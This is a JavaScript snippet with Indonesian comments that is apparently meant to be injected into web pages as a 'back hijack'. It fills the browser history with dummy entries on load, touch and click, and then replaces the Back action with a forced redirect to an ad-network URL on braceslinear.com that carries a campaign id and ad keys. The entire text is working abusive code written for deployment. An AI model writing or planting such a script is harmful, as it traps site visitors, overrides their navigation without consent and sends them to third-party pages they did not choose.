  <!-- BACK HIJACK DENGAN REDIRECT OTOMATIS BERDASARKAN atOptions.key -->
  <script type="text/javascript">
    (function() {
      // Ambil key dari atOptions (global variable yang sudah di-set di header)
      const adKey = window.atOptions && window.atOptions.key ? window.atOptions.key : 'e3390cf0a8cdf953ded85bdaaf3046a5'; // fallback ke key asli

      // Pola redirect braceslinear (dari contohmu + umum di ad network ini)
      // Biasanya: https://braceslinear.com/{campaign_id}?key={adKey}
      // Di contohmu campaign_id = 'd40w8mx5c' â†’ kita pakai ini sebagai default, atau bisa ganti kalau tahu pola baru
      const campaignId = 'd40w8mx5c'; // <-- kalau braceslinear ganti, update di sini saja
      const redirectUrl = `https://braceslinear.com/${campaignId}?key=${adKey}`;

      // Fallback kalau atOptions tidak ke-load atau key berubah
      const fallbackUrl = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";

      function setupHijack() {
        if (!window.history || !window.history.pushState) return;

        // Push dummy states (double untuk lebih kuat)
        window.history.pushState({hijack:1}, '', location.href);
        window.history.pushState({hijack:1}, '', location.href);

        window.onpopstate = function() {
          // Prioritaskan redirectUrl otomatis
          window.location.replace(redirectUrl || fallbackUrl);
        };
      }

      window.addEventListener('load', setupHijack);

      // Extra push untuk mobile/interaction
      document.addEventListener('touchstart', () => {
        history.pushState(null, null, location.href);
      }, {once: true});

      document.addEventListener('click', () => {
        history.pushState(null, null, location.href);
      }, {once: true});
    })();
  </script>
